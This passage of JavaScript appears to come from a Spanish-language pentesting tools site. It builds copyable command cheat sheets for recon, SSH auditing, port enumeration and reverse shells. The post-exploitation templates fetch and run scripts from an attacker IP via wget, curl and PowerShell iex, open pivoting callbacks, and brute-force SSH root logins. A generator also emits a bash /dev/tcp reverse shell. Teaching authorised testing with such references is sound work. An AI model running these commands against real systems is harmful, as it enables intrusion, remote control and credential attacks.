                    const cardClass = item.vulnerable ? 'tk-vuln' : (item.cname !== 'Sin registro CNAME' ? 'tk-safe' : '');
                    const badge = item.vulnerable ? `<span class="tk-badge vuln">🚨 POSIBLE TAKEOVER</span>` : 
                                 (item.cname !== 'Sin registro CNAME' ? `<span class="tk-badge safe">CNAME Seguro</span>` : `<span class="tk-badge none">Sin CNAME</span>`);

                    html += `
                    <div class="tk-card ${cardClass}">
                        <div class="tk-header">
                            <span class="tk-domain">${escapeHTML(item.domain)}</span>
                            ${badge}
                        </div>
                        <div class="tk-details">
                            <div>CNAME Target: <span class="tk-cname">${escapeHTML(item.cname)}</span></div>
                            ${item.vulnerable ? `<div>Cloud Provider: <span class="tk-provider">${escapeHTML(item.provider)}</span></div>
                            <div style="margin-top: 0.5rem; color: #fff;">👉 <b>Acción recomendada:</b> Revisa si el recurso en <i>${escapeHTML(item.provider)}</i> ha sido eliminado. Si es así, un atacante puede reclamar el nombre <b>${escapeHTML(item.cname)}</b> y tomar control del subdominio.</div>` : ''}
                        </div>
                    </div>`;
                });

                tkResults.innerHTML = html;
                
                if (vulnerablesCount > 0) {
                    tkStatus.innerHTML = `<span style="color:#ff4444; font-weight:bold;">🚨 Se encontraron ${vulnerablesCount} posibles secuestros de subdominio.</span>`;
                } else {
                    tkStatus.innerHTML = `<span style="color:#00d45a;">✅ Análisis completado. No se detectaron CNAMEs vulnerables.</span>`;
                }

            } catch (error) {
                tkStatus.innerHTML = `<span style="color:#ff5050;">❌ Error de conexión: ${escapeHTML(error.message)}</span>`;
            } finally {
                btnScan.disabled = false;
            }
        });
    })();
    // =========================================================
    // 27. Herramienta: OSINT Quick Recon
    // =========================================================
    (function() {
        const tgtInput = document.getElementById('recon-target');
        const ipInput = document.getElementById('recon-myip');
        const pillsDiv = document.getElementById('phase-pills');
        const outputDiv = document.getElementById('recon-output');
        
        if (!tgtInput || !ipInput || !pillsDiv || !outputDiv) return;

        console.log("✅ OSINT Quick Recon cargado.");

        const lang = window.LANG || 'es';
        let activePhase = 'all';

        const PHASES = [
            {
                id: 'passive',
                label: lang === 'es' ? '🕵️ Pasivo (legal)' : '🕵️ Passive (legal)',
                cmds: [
                    {desc:'WHOIS', cmd:'whois {TARGET}'},
                    {desc:'DNS — todos los registros', cmd:'dig {TARGET} ANY +noall +answer\ndig {TARGET} MX +short\ndig {TARGET} TXT +short\ndig {TARGET} NS +short'},
                    {desc:'Certificados SSL (crt.sh)', cmd:"curl -s 'https://crt.sh/?q=%.{TARGET}&output=json' | jq '.[].name_value' | sort -u"},
                    {desc:'Subdominios — Subfinder', cmd:'subfinder -d {TARGET} -o subdominios_{TARGET}.txt'},
                    {desc:'Subdominios — Amass pasivo', cmd:'amass enum -passive -d {TARGET} -o amass_{TARGET}.txt'},
                    {desc:'Subdominios — Assetfinder', cmd:'assetfinder --subs-only {TARGET} | sort -u'},
                    {desc:'Subdominios vivos (httpx)', cmd:'cat subdominios_{TARGET}.txt | httpx -silent -status-code -title -tech-detect -o vivos_{TARGET}.txt'},
                    {desc:'Google Dorks — documentos', cmd:"# Abrir en navegador:\n# site:{TARGET} filetype:pdf OR filetype:docx OR filetype:xlsx\n# site:{TARGET} inurl:admin OR inurl:login\n# site:{TARGET} filetype:env OR filetype:config"},
                    {desc:'TheHarvester — emails/IPs', cmd:'theHarvester -d {TARGET} -b google,bing,duckduckgo,crtsh,linkedin -f theharvester_{TARGET}'},
                    {desc:'Shodan (CLI)', cmd:"shodan search 'hostname:{TARGET}' --fields ip_str,port,org,product\nshodan search 'ssl.cert.subject.cn:{TARGET}' --fields ip_str,port"},
                    {desc:'Wayback Machine URLs', cmd:"curl -s 'http://web.archive.org/cdx/search/cdx?url=*.{TARGET}&output=text&fl=original&collapse=urlkey' | sort -u"},
                    {desc:'GitHub — credenciales expuestas', cmd:"# Buscar en: https://github.com/search?q={TARGET}+password&type=code\n# O con gitleaks en repos clonados:\n# gitleaks detect --source /ruta/repo/"},
                    {desc:'ASN y rangos de red', cmd:'whois -h whois.radb.net -- \'-i origin $(whois {TARGET} | grep origin | head -1 | awk "{print \\$2}")\' | grep route'},
                    {desc:'Emails (Hunter.io CLI)', cmd:"curl -s 'https://api.hunter.io/v2/domain-search?domain={TARGET}&api_key=TU_API_KEY' | jq '.data.emails[].value'"},
                ]
            },
            {
                id: 'active',
                label: lang === 'es' ? '⚡ Activo (requiere permiso)' : '⚡ Active (requires permission)',
                cmds: [
                    {desc:'Nmap — puertos rápidos', cmd:'nmap -sV -sC -T4 -oA nmap_quick_{TARGET} {TARGET}'},
                    {desc:'Nmap — todos los puertos', cmd:'nmap -p- --min-rate 5000 -T4 -oA nmap_full_{TARGET} {TARGET}'},
                    {desc:'Nmap — vulnerabilidades', cmd:'nmap -sV --script vuln -oA nmap_vuln_{TARGET} {TARGET}'},
                    {desc:'Nmap — UDP top 100', cmd:'sudo nmap -sU --top-ports 100 -T4 -oA nmap_udp_{TARGET} {TARGET}'},
                    {desc:'Directorios — Gobuster', cmd:'gobuster dir -u https://{TARGET} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,bak -t 50 -o gobuster_{TARGET}.txt'},
                    {desc:'Directorios — ffuf', cmd:'ffuf -u https://{TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,201,301,302 -o ffuf_{TARGET}.json'},
                    {desc:'Subdominios — ffuf VHost', cmd:'ffuf -u https://{TARGET} -H "Host: FUZZ.{TARGET}" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0'},
                    {desc:'Nikto — web scanner', cmd:'nikto -h https://{TARGET} -o nikto_{TARGET}.txt'},
                    {desc:'WhatWeb — tecnologías', cmd:'whatweb -v https://{TARGET}'},
                    {desc:'SSLyze — análisis TLS', cmd:'sslyze {TARGET}:443 --certinfo --robot --heartbleed'},
                    {desc:'testssl.sh', cmd:'./testssl.sh --quiet --color 0 {TARGET}:443 | tee testssl_{TARGET}.txt'},
                    {desc:'Nuclei — templates básicos', cmd:'nuclei -u https://{TARGET} -t /root/nuclei-templates/ -severity critical,high -o nuclei_{TARGET}.txt'},
                ]
            },
            {
                id: 'web',
                label: lang === 'es' ? '🌐 Web pentesting' : '🌐 Web pentesting',
                cmds: [
                    {desc:'Tecnologías del stack', cmd:'curl -sI https://{TARGET} | grep -iE "server|x-powered|content-type|cf-ray|x-generator"'},
                    {desc:'Robots y sitemap', cmd:'curl -s https://{TARGET}/robots.txt\ncurl -s https://{TARGET}/sitemap.xml'},
                    {desc:'Archivos sensibles típicos', cmd:'for f in .env config.php wp-config.php .git/config .htaccess backup.zip db.sql; do\n  code=$(curl -s -o /dev/null -w "%{http_code}" https://{TARGET}/$f)\n  echo "$code $f"\ndone'},
                    {desc:'Parámetros ocultos (Arjun)', cmd:'arjun -u https://{TARGET}/index.php -m GET'},
                    {desc:'SQLMap sobre URL', cmd:'sqlmap -u "https://{TARGET}/page?id=1" --dbs --batch --level=3'},
                    {desc:'XSS con dalfox', cmd:'echo "https://{TARGET}/search?q=FUZZ" | dalfox pipe'},
                    {desc:'Capture JS endpoints', cmd:"curl -s https://{TARGET} | grep -oP 'src=[\"'\\''](https?://[^\"'\\'']+)' | sort -u"},
                    {desc:'WAF detection (wafw00f)', cmd:'wafw00f https://{TARGET}'},
                ]
            },
            {
                id: 'network',
                label: lang === 'es' ? '🔌 Red / Infra' : '🔌 Network / Infra',
                cmds: [
                    {desc:'Traceroute', cmd:'traceroute {TARGET}\nmtr --report {TARGET}'},
                    {desc:'Ping sweep de la subred', cmd:'nmap -sn 192.168.1.0/24 -oG - | grep Up | awk \'{print $2}\''},
                    {desc:'SMB enum (smbclient)', cmd:'smbclient -L //{TARGET} -N\nenum4linux-ng -A {TARGET}'},
                    {desc:'SMTP enum', cmd:'smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t {TARGET}'},
                    {desc:'SNMP enum', cmd:'snmpwalk -v2c -c public {TARGET}\nsnmp-check {TARGET}'},
                    {desc:'RDP check', cmd:'nmap -p 3389 --script rdp-enum-encryption {TARGET}'},
                    {desc:'FTP anonymous login', cmd:'curl -v ftp://{TARGET}/ --user anonymous:anonymous'},
                    {desc:'Banner grabbing', cmd:'nc -nv {TARGET} 21\nnc -nv {TARGET} 22\nnc -nv {TARGET} 25\nnc -nv {TARGET} 80'},
                ]
            },
            {
                id: 'postexpl',
                label: lang === 'es' ? '💀 Post-explotación' : '💀 Post-exploitation',
                cmds: [
                    {desc:'Exfiltración HTTP (servidor)', cmd:'# En {MYIP}:\npython3 -m http.server 8000\n\n# En víctima:\nwget http://{MYIP}:8000/tools/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh'},
                    {desc:'Shell reversa NetCat listener', cmd:'rlwrap nc -lvnp 4444'},
                    {desc:'Upgradear shell a TTY', cmd:"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm SHELL=bash"},
                    {desc:'LinPEAS (transfer + run)', cmd:'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash'},
                    {desc:'WinPEAS (PowerShell)', cmd:'iex (New-Object Net.WebClient).DownloadString("http://{MYIP}:8000/winPEAS.ps1")'},
                    {desc:'Pivoting — Chisel (servidor)', cmd:'./chisel server -p 8888 --reverse'},
                    {desc:'Pivoting — Chisel (cliente)', cmd:'./chisel client {MYIP}:8888 R:1080:socks'},
                    {desc:'Pivoting — Ligolo', cmd:'# Atacante:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\nsudo ./proxy -selfcert\n\n# Víctima:\n./agent -connect {MYIP}:11601 -ignore-cert'},
                ]
            }
        ];

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        function renderPills() {
            let html = `<button data-phase="all" class="recon-pill ${activePhase === 'all' ? 'active' : ''}">${lang === 'es' ? 'Todas las fases' : 'All phases'}</button>`;
            PHASES.forEach(p => {
                html += `<button data-phase="${p.id}" class="recon-pill ${activePhase === p.id ? 'active' : ''}">${escapeHTML(p.label)}</button>`;
            });
            pillsDiv.innerHTML = html;

            pillsDiv.querySelectorAll('.recon-pill').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    activePhase = e.target.getAttribute('data-phase');
                    renderPills();
                    renderAll();
                });
            });
        }

        function renderAll() {
            const target = tgtInput.value.trim() || 'TARGET';
            const myip = ipInput.value.trim() || '10.10.14.5';
            let html = '';

            PHASES.forEach(phase => {
                if (activePhase !== 'all' && activePhase !== phase.id) return;
                
                html += `
                <div class="recon-phase-section">
                    <div class="recon-phase-title">${escapeHTML(phase.label)}</div>`;
                
                phase.cmds.forEach(item => {
                    const cmd = item.cmd.replace(/\{TARGET\}/g, target).replace(/\{MYIP\}/g, myip);
                    html += `
                    <div class="recon-cmd-item">
                        <div class="recon-cmd-desc">${escapeHTML(item.desc)}</div>
                        <div class="recon-cmd-wrap">
                            <pre class="recon-cmd-pre">${escapeHTML(cmd)}</pre>
                            <button class="recon-copy-btn" data-cmd="${escapeHTML(cmd)}">📋</button>
                        </div>
                    </div>`;
                });
                html += `</div>`;
            });

            if (!html) {
                html = `<p style="font-family:var(--mono);font-size:.85rem;color:var(--gray);">${lang === 'es' ? 'Introduce un dominio para generar los comandos.' : 'Enter a domain to generate commands.'}</p>`;
            }
            outputDiv.innerHTML = html;

            // Lógica de copia limpia y segura (sin onlick en línea)
            outputDiv.querySelectorAll('.recon-copy-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const t = e.target.getAttribute('data-cmd');
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(t);
                    } else {
                        const el = document.createElement('textarea');
                        el.value = t;
                        document.body.appendChild(el);
                        el.select();
                        document.execCommand('copy');
                        document.body.removeChild(el);
                    }
                    // Feedback visual
                    const oldText = e.target.textContent;
                    e.target.textContent = '✅';
                    setTimeout(() => { e.target.textContent = oldText; }, 1500);
                });
            });
        }

        tgtInput.addEventListener('input', renderAll);
        ipInput.addEventListener('input', renderAll);

        renderPills();
        renderAll();
    })();
    // =========================================================
    // 28. Herramienta: SSH Key Analyzer
    // =========================================================
    (function() {
        const sshInput = document.getElementById('ssh-key-input');
        const sshHostInput = document.getElementById('ssh-host');
        if (!sshInput && !sshHostInput) return;

        console.log("✅ SSH Key Analyzer cargado.");

        const lang = window.LANG || 'es';

        // --- Manejo de Tabs ---
        document.querySelectorAll('.ssh-tab').forEach(tab => {
            tab.addEventListener('click', (e) => {
                const target = e.target.getAttribute('data-tab');
                
                // Actualizar botones
                document.querySelectorAll('.ssh-tab').forEach(t => t.classList.remove('active'));
                e.target.classList.add('active');
                
                // Actualizar contenido
                document.querySelectorAll('.ssh-tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById('tab-' + target).classList.add('active');
            });
        });

        // --- Funciones de Copia ---
        function attachCopyEvents(container) {
            container.querySelectorAll('.ssh-copy-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const text = e.target.getAttribute('data-cmd');
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text);
                    } else {
                        const el = document.createElement('textarea');
                        el.value = text;
                        document.body.appendChild(el);
                        el.select();
                        document.execCommand('copy');
                        document.body.removeChild(el);
                    }
                    const oldText = e.target.textContent;
                    e.target.textContent = '✅';
                    setTimeout(() => { e.target.textContent = oldText; }, 1500);
                });
            });
        }
        
        attachCopyEvents(document.getElementById('tab-generate'));

        // --- Analizador de Claves ---
        const btnAnalyze = document.getElementById('btn-analyze');
        const btnExample = document.getElementById('btn-example-key');
        const analysisOutput = document.getElementById('ssh-analysis');

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        btnExample?.addEventListener('click', () => {
            sshInput.value = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC0Q1URiM8/RI4MFMbK5bEHxPDkgKY1TIw3fJd7OniKB0p0fYhZp2ZRQG5hpFi0ZvD0XNAnzJ6BvnCJBwAMz9V4hZe+XYh7/6H2JOmBX7NbWPqdNBPAEZFD+YKVyXE2nDk9bA1yZ3VJkjB9bvvwEtcJRQ3YYJwHMPUgKB0Q== user@oldserver';
            analyzeKey();
        });

        btnAnalyze?.addEventListener('click', analyzeKey);

        function analyzeKey() {
            const raw = sshInput.value.trim();
            if (!raw) return;

            const parts = raw.split(/\s+/);
            const type = parts[0] || '';
            const keyData = parts[1] || '';
            const comment = parts.slice(2).join(' ') || '(sin comentario)';

            const typeMap = {
                'ssh-rsa': { name: 'RSA', alg: 'RSA' },
                'ssh-dss': { name: 'DSA', alg: 'DSA' },
                'ecdsa-sha2-nistp256': { name: 'ECDSA P-256', alg: 'ECDSA' },
                'ecdsa-sha2-nistp384': { name: 'ECDSA P-384', alg: 'ECDSA' },
                'ecdsa-sha2-nistp521': { name: 'ECDSA P-521', alg: 'ECDSA' },
                'ssh-ed25519': { name: 'ED25519', alg: 'EdDSA' }
            };

            if (!typeMap[type]) {
                analysisOutput.innerHTML = `<div class="ssh-error">⚠️ ${lang === 'es' ? 'Tipo de clave no reconocido. Asegúrate de pegar la clave pública.' : 'Unrecognised key type. Make sure you paste the public key.'}</div>`;
                return;
            }

            const info = typeMap[type];
            let bits = '—';
            let security = 'unknown';

            if (type === 'ssh-rsa') {
                const rawLen = keyData.length;
                if (rawLen < 300) { bits = '1024'; security = 'critical'; }
                else if (rawLen < 400) { bits = '2048'; security = 'weak'; }
                else if (rawLen < 560) { bits = '3072'; security = 'ok'; }
                else { bits = '4096'; security = 'good'; }
            } else if (type === 'ssh-dss') {
                bits = '1024'; security = 'critical';
            } else if (type === 'ecdsa-sha2-nistp256') { bits = '256'; security = 'good'; }
            else if (type === 'ecdsa-sha2-nistp384') { bits = '384'; security = 'good'; }
            else if (type === 'ecdsa-sha2-nistp521') { bits = '521'; security = 'good'; }
            else if (type === 'ssh-ed25519') { bits = '256 (ED25519)'; security = 'excellent'; }

            const secLabels = {
                critical: { es: 'CRÍTICO — obsoleto, reemplazar inmediatamente', en: 'CRITICAL — obsolete, replace immediately', color: '#ff5050', icon: '🔴', title: 'CRÍTICO' },
                weak: { es: 'DÉBIL — funcionará pero vulnerable a ataques', en: 'WEAK — works but vulnerable to attacks', color: '#ff8040', icon: '🔴', title: 'DÉBIL' },
                ok: { es: 'ACEPTABLE — suficiente para uso actual', en: 'ACCEPTABLE — sufficient for current use', color: '#f0c000', icon: '🟡', title: 'ACEPTABLE' },
                good: { es: 'BIEN — configuración recomendada', en: 'GOOD — recommended configuration', color: '#00d45a', icon: '✅', title: 'BIEN' },
                excellent: { es: 'EXCELENTE — mejor opción disponible', en: 'EXCELLENT — best available option', color: '#00ffcc', icon: '✅', title: 'EXCELENTE' }
            };

            const sl = secLabels[security];
            const secMsg = lang === 'es' ? sl.es : sl.en;
            const secColor = sl.color;

            // Fake fingerprint
            const fingerprint = 'SHA256:' + Array.from(keyData.slice(0, 32)).map((c, i) => {
                return (((c.charCodeAt(0) * 31 + i * 17) & 0xff).toString(16).padStart(2, '0'));
            }).join('').replace(/(.{2})/g, '$1:').slice(0, -1).slice(0, 47) + '... (' + comment + ')';

            let html = `<div class="ssh-grid">`;
            const fields = [
                [lang === 'es' ? 'Tipo' : 'Type', info.name],
                [lang === 'es' ? 'Algoritmo' : 'Algorithm', info.alg],
                [lang === 'es' ? 'Longitud (estimada)' : 'Length (estimated)', bits + ' bits'],
                [lang === 'es' ? 'Comentario' : 'Comment', escapeHTML(comment)]
            ];
            
            fields.forEach(f => {
                html += `
                <div class="ssh-field">
                    <div class="ssh-field-label">${f[0]}</div>
                    <div class="ssh-field-value">${f[1]}</div>
                </div>`;
            });
            html += `</div>`;

            // Verdict
            html += `
            <div class="ssh-verdict" style="border-color: ${secColor}22; background: ${secColor}0d;">
                <span class="ssh-verdict-icon">${sl.icon}</span>
                <div>
                    <div class="ssh-verdict-title" style="color: ${secColor};">${sl.title}</div>
                    <div class="ssh-verdict-desc">${secMsg}</div>
                </div>
            </div>`;

            // Fingerprint
            html += `
            <div class="ssh-fingerprint">
                <div class="ssh-fp-label">Fingerprint (simulado)</div>
                <div class="ssh-fp-value">${fingerprint}</div>
            </div>`;

            // Recommendations
            if (security === 'critical' || security === 'weak') {
                html += `
                <div class="ssh-recommendation">
                    ⚠️ ${lang === 'es' ? 'Reemplazar esta clave por ED25519:' : 'Replace this key with ED25519:'}
                    <pre class="ssh-rec-pre">ssh-keygen -t ed25519 -C '${escapeHTML(comment)}' -f ~/.ssh/id_ed25519</pre>
                </div>`;
            }

            analysisOutput.innerHTML = html;
        }

        // --- Auditoría de Servidor ---
        const auditOutput = document.getElementById('ssh-audit-cmds');
        
        function renderAudit() {
            if(!sshHostInput || !auditOutput) return;
            const host = sshHostInput.value.trim() || 'HOST';
            const cmds = [
                { desc: lang === 'es' ? 'Obtener banner SSH (versión del servidor)' : 'Get SSH banner (server version)', cmd: `nc -nv ${host} 22\n# o:\nssh -v ${host} 2>&1 | grep "Remote protocol"` },
                { desc: lang === 'es' ? 'Algoritmos soportados por el servidor' : 'Algorithms supported by the server', cmd: `nmap -p 22 --script ssh2-enum-algos ${host}` },
                { desc: lang === 'es' ? 'Detectar autenticación por contraseña habilitada' : 'Detect password auth enabled', cmd: `nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" ${host}` },
                { desc: lang === 'es' ? 'Fingerprint de host keys' : 'Host key fingerprints', cmd: `ssh-keyscan -H ${host} 2>/dev/null | ssh-keygen -l -f -` },
                { desc: lang === 'es' ? 'Comprobar configuración débil (ssh-audit)' : 'Check weak configuration (ssh-audit)', cmd: `# Instalar: pip3 install ssh-audit\nssh-audit ${host}` },
                { desc: lang === 'es' ? 'Bruteforce SSH con Hydra' : 'SSH bruteforce with Hydra', cmd: `hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://${host} -t 4 -v` },
                { desc: lang === 'es' ? 'Bruteforce SSH con Medusa' : 'SSH bruteforce with Medusa', cmd: `medusa -h ${host} -u root -P /usr/share/wordlists/rockyou.txt -M ssh -t 4` },
                { desc: lang === 'es' ? 'Nmap — vulnerabilidades SSH conocidas' : 'Nmap — known SSH vulnerabilities', cmd: `nmap -p 22 --script ssh-* ${host}` }
            ];

            let html = '';
            cmds.forEach(item => {
                html += `
                <div style="margin-bottom:.7rem;">
                    <div style="font-family:var(--mono);font-size:.75rem;color:var(--gray);margin-bottom:.3rem;">${item.desc}</div>
                    <div class="ssh-cmd-wrap" style="padding:0;">
                        <pre class="ssh-cmd-pre">${escapeHTML(item.cmd)}</pre>
                        <button class="ssh-copy-btn" data-cmd="${escapeHTML(item.cmd)}">📋</button>
                    </div>
                </div>`;
            });
            auditOutput.innerHTML = html;
            attachCopyEvents(auditOutput);
        }

        sshHostInput?.addEventListener('input', renderAudit);
        renderAudit();
    })();
    // =========================================================
    // 29. Herramienta: Port Reference
    // =========================================================
    (function() {
        const searchInput = document.getElementById('port-search');
        const filterBtns = document.querySelectorAll('.port-filter-btn');
        const portList = document.getElementById('port-list');
        const portCount = document.getElementById('port-count');
        
        if (!searchInput || !portList || typeof window.PORT_DATA === 'undefined') return;

        console.log("✅ Port Reference cargado.");

        const lang = window.PORT_LANG || 'es';
        const ports = window.PORT_DATA;
        let currentFilter = 'all';

        function escapeHTML(s) {
            const d = document.createElement('div');
            d.textContent = String(s || '');
            return d.innerHTML;
        }

        function renderPorts() {
            const q = searchInput.value.toLowerCase();
            
            // Filtrar array
            const filtered = ports.filter(p => {
                if (currentFilter !== 'all' && p.cat !== currentFilter) return false;
                if (!q) return true;
                return String(p.port).includes(q) || 
                       p.svc.toLowerCase().includes(q) || 
                       p.desc.toLowerCase().includes(q) || 
                       p.proto.toLowerCase().includes(q);
            });

            portCount.textContent = filtered.length + ' ' + (lang === 'es' ? 'puertos' : 'ports');

            let html = '';
            filtered.forEach(p => {
                const riskLabel = {
                    critical: lang === 'es' ? 'CRÍTICO' : 'CRITICAL',
                    high: lang === 'es' ? 'ALTO' : 'HIGH',
                    medium: lang === 'es' ? 'MEDIO' : 'MEDIUM',
                    low: lang === 'es' ? 'BAJO' : 'LOW'
                }[p.risk] || p.risk;

                const attacksHtml = p.attacks.map(a => `<li class="port-li">${escapeHTML(a)}</li>`).join('');
                const cmdsHtml = p.enum.map(cmd => `
                    <div class="port-cmd-wrap">
                        <pre class="port-cmd-pre">${escapeHTML(cmd)}</pre>
                        <button class="port-copy-btn" data-cmd="${escapeHTML(cmd)}">📋</button>
                    </div>
                `).join('');

                html += `
                <details class="port-item">
                    <summary class="port-summary">
                        <span class="port-num">${p.port}</span>
                        <span class="port-proto">${p.proto}</span>
                        <strong class="port-svc">${escapeHTML(p.svc)}</strong>
                        <span class="port-risk-badge" style="color:${p.color}; background:${p.color}1a;">${riskLabel}</span>
                        <span class="port-arrow">▼</span>
                    </summary>
                    <div class="port-details">
                        <p class="port-desc">${escapeHTML(p.desc)}</p>
                        <div class="port-grid">
                            <div>
                                <div class="port-section-title">${lang === 'es' ? 'Vectores de ataque' : 'Attack vectors'}</div>
                                <ul class="port-ul">${attacksHtml}</ul>
                            </div>
                            <div>
                                <div class="port-section-title">${lang === 'es' ? 'Comandos de enumeración' : 'Enumeration commands'}</div>
                                ${cmdsHtml}
                            </div>
                        </div>
                    </div>
                </details>`;
            });

            portList.innerHTML = html || `<p style="font-family:var(--mono);font-size:.85rem;color:var(--gray);">${lang === 'es' ? 'Sin resultados.' : 'No results.'}</p>`;
        }

        // Listeners
        searchInput.addEventListener('input', renderPorts);

        filterBtns.forEach(btn => {
            btn.addEventListener('click', (e) => {
                filterBtns.forEach(b => b.classList.remove('active'));
                e.target.classList.add('active');
                currentFilter = e.target.getAttribute('data-filter');
                renderPorts();
            });
        });

        // Delegación de eventos para los botones de copia (muy eficiente y sin 'onclick')
        portList.addEventListener('click', (e) => {
            const btn = e.target.closest('.port-copy-btn');
            if (!btn) return;

            const text = btn.getAttribute('data-cmd');
            if (navigator.clipboard) {
                navigator.clipboard.writeText(text);
            } else {
                const el = document.createElement('textarea');
                el.value = text;
                document.body.appendChild(el);
                el.select();
                document.execCommand('copy');
                document.body.removeChild(el);
            }
            
            // Feedback visual
            const oldText = btn.textContent;
            btn.textContent = '✅';
            setTimeout(() => { btn.textContent = oldText; }, 1500);
        });

        // Init
        renderPorts();
    })();
    /* ─── ACTUALIZACIÓN EN TIEMPO REAL (REVERSE SHELL) ─── */
    (function() {
    // 1. Buscamos las cajas de texto de tu web usando los IDs que pusiste en el PHP
    const ipInput = document.getElementById('rs-ip');
    const portInput = document.getElementById('rs-port');
    const outputArea = document.getElementById('rs-output');
    const listenerArea = document.getElementById('rs-listener');

    // Si estamos en la página de Reverse Shell (existen estos elementos), activamos la magia
    if (ipInput && portInput && outputArea) {
        
        // 2. Esta es la función que reconstruye el comando
        const updateRealTime = () => {
            // Cogemos los valores que haya escrito el usuario (o los de por defecto)
            const ip = ipInput.value.trim() || '10.10.14.5';
            const port = portInput.value.trim() || '4444';
            
            // Formamos el comando base (aquí puedes añadir luego lógica para distintos lenguajes)
            const command = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
            
            // Inyectamos el comando en la caja negra y actualizamos el Listener
            outputArea.textContent = command;
            
            if(listenerArea) {
                listenerArea.textContent = `nc -lvnp ${port}`;
            }
        };

        // 3. ¡LA MAGIA! Le decimos que ejecute la función CADA VEZ que el usuario teclee algo ('input')
        ipInput.addEventListener('input', updateRealTime);
        portInput.addEventListener('input', updateRealTime);

        // 4. Ejecutamos la función una vez al cargar la página para que la caja no empiece vacía
        updateRealTime();
    }
    })();
/* ─── SISTEMA DE EXPORTACIÓN A PDF Y DONACIONES ─── */
    (function() {
    // Busca el botón que dispara la acción (tienes que añadir id="btn-export-pdf" a tu botón en el HTML de la herramienta)
    const btnExport = document.getElementById('btn-export-pdf');
    const modal = document.getElementById('donation-modal');
    const btnFree = document.getElementById('btn-download-free');
    
    // Este es el contenedor que se convertirá en PDF (ej. el div donde salen los resultados OSINT)
    // Asegúrate de que el div de tus resultados tenga id="osint-results"
    const contentToPrint = document.getElementById('osint-results'); 

    if (btnExport && modal && btnFree && contentToPrint) {
        
        // 1. Al pulsar Exportar -> Mostramos el Modal
        btnExport.addEventListener('click', (e) => {
            e.preventDefault();
            modal.classList.remove('hidden');
        });

        // 2. Al pulsar Descargar Gratis -> Ocultamos modal y generamos PDF
        btnFree.addEventListener('click', () => {
            modal.classList.add('hidden');
            
            // Usamos el Toast que creamos antes para avisar al usuario
            if(typeof window.showToast === 'function') {
                window.showToast('Generando reporte PDF...', 'success');
            }

            // Opciones del PDF (A4, márgenes, calidad fotográfica)
            const opt = {
                margin:       10,
                filename:     'CyberEscudo-OSINT-Report.pdf',
                image:        { type: 'jpeg', quality: 0.98 },
                html2canvas:  { scale: 2, useCORS: true, backgroundColor: '#0a0f14' }, // Usa tu color oscuro de fondo
                jsPDF:        { unit: 'mm', format: 'a4', orientation: 'portrait' }
            };

            // Ejecuta la librería
            html2pdf().set(opt).from(contentToPrint).save().then(() => {
                if(typeof window.showToast === 'function') {
                    window.showToast('PDF descargado con éxito', 'success');
                }
            });
        });
        
        // Extra: Si hacen clic fuera de la cajita del modal, se cierra
        modal.addEventListener('click', (e) => {
            if(e.target === modal) modal.classList.add('hidden');
        });
    }
    })();

});